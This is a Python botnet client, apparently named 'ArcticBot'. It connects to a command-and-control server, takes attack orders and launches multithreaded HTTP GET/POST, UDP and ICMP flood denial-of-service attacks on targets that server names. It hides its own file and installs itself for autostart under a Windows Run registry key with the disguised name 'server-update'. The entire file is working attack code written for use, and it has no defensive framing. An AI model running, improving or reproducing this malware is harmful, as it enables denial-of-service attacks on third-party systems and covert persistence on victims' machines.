mode = 'py'
address = '127.0.0.1'
port = 6240
Threads = 10
buffsize = 512
Attribute_hide = True
Self_starting = True
#Testing code, will be delete in generation
from socket import *
from threading import Thread
from random import _urandom, randint
from os.path import abspath
from sys import argv
s = socket(AF_INET, SOCK_STREAM) # create socket
ddos_flag = False # used to control ddos attack thread
path = abspath(argv[0]) # used in .exe mode

def ddos(mode:str, ip:str): #ip : ip or url
    '''
    This method is the main attack method
    mode is ta supported attack method 
    THE IP CAN BE A IP OR A URL
    each method will define a method "attack", which will be execute countless times by thread and infinite loop
    the "attack" method require a ip or url
    '''
    print("[*]Start attack")
    if mode == 'httpGETflood' or mode == 'httpflood' or mode == 'httpPOSTflood': # httpflood method : only http GET flood
        from urllib import request,parse
        from ssl import _create_unverified_context
        dict = {
            "name":"ArcticWolf"
        } # can be changed
        context = _create_unverified_context()
        data = bytes(parse.urlencode(dict), encoding='utf8')
        def attack(ip):
            global ddos_flag
            while True:
                if ddos_flag: return
                try:
                    if mode == 'httpGETflood' or 'httpflood': # GETflood for default
                        with request.urlopen(ip, context=context)as response:
                            print('[*]code:', response.status)
                    elif mode == 'httpPOSTflood':
                        with request.urlopen(ip, data=data, context=context) as response:
                            print('[*]code:', response.status)
                except Exception as e:
                    print(e)
                    pass
    elif mode == 'UDPflood': # UDPflood
        def attack(ip):
            sock = socket(AF_INET, SOCK_DGRAM)
            byte = _urandom(1490)
            port = 1
            sent = 0
            while True:
                sock.sendto(byte, (ip, port))
                sent = sent + 1
                print(f"[*] Sent " + str(sent) + " packet to " + ip + " through port " + str(port))
                port += 1
                if port == 65534:
                    port = 1
    elif mode == 'ICMPflood':
        from array import array
        from struct import pack, unpack
        from time import time

        header = pack('bbHHh', 8, 0, 0, 12345, 0)  # create header
        data = pack('d', time())  # create data, random time
        packet = header + data
        if len(packet) & 1:
            packet = packet + '\0'
        words = array('h', packet)
        sum = 0
        for word in words:
            sum += (word & 0xffff)
        sum = (sum >> 16) + (sum & 0xffff)
        sum = sum + (sum >> 16)
        chkSum = (~sum) & 0xffff
        header = pack('bbHHh', 8, 0, chkSum, 12345, 0)
        icmp_data = header + data
        Sock = socket(AF_INET, SOCK_RAW, getprotobyname("icmp"))
        def attack(ip):
            while True:
                Sock.sendto(icmp_data , (ip, 0))
                recv_packet, addr = Sock.recvfrom(1024)
                print('[*]ttl: ' + unpack("!BBHHHBBHII", recv_packet[:20])[5])
    print('[*]Attack:', ip)
    for i in range(Threads): Thread(target=attack, args=(ip,)).start()
def connect():
    global s
    try:
        try:
            s.connect((address, port))
            if s.recv(buffsize).decode('utf8') == 'ArcticBotCheck':
                s.send('CheckOK'.encode('utf8'))
            print(f'[*]Connected to {address} : {port}')
        except ConnectionRefusedError:
            print('[*]reset')
            connect()
        while True:
            global ddos_flag
            recvdata = s.recv(buffsize).decode('utf-8')
            print('[*]'+recvdata)
            if recvdata == 'stop_ddos':
                ddos_flag = True
            if recvdata.split('_')[0] == 'attack':
                ddos_flag = False
                Thread(target=ddos, args=(recvdata.split('_')[1], recvdata.split("_")[2],)).start()
            if recvdata == 'heartbeat':
                s.send("heartbeat".encode("utf8"))
    except Exception as e:
        print(e)
        s.close()
        s = socket(AF_INET, SOCK_STREAM)
        connect()
def hide():
    global path
    if Attribute_hide:
        import win32api, win32con
        win32api.SetFileAttributes(path,win32con.FILE_ATTRIBUTE_HIDDEN) 
        print("[*]File hidden") 
    if Self_starting:
        print('[*]Installing to "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"')
        reg_root = win32con.HKEY_CURRENT_USER
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = win32api.RegOpenKey(reg_root, reg_path, 0, win32con.KEY_ALL_ACCESS)
        if mode == 'py':
            win32api.RegSetValueEx(key, "server-update", 0, win32con.REG_SZ, path)
        if mode == 'exe':
            win32api.RegSetValueEx(key, "server-update", 0, win32con.REG_SZ, 'python' + path)
        win32api.RegCloseKey(key)
        print("[+]Installed")
if __name__ == '__main__':
    print("[*]start")
    # threading.Thread(target=connect).start()
    try:
        hide()
        connect()
    except Exception as e:
        print(e)

# Blank line(will be delete)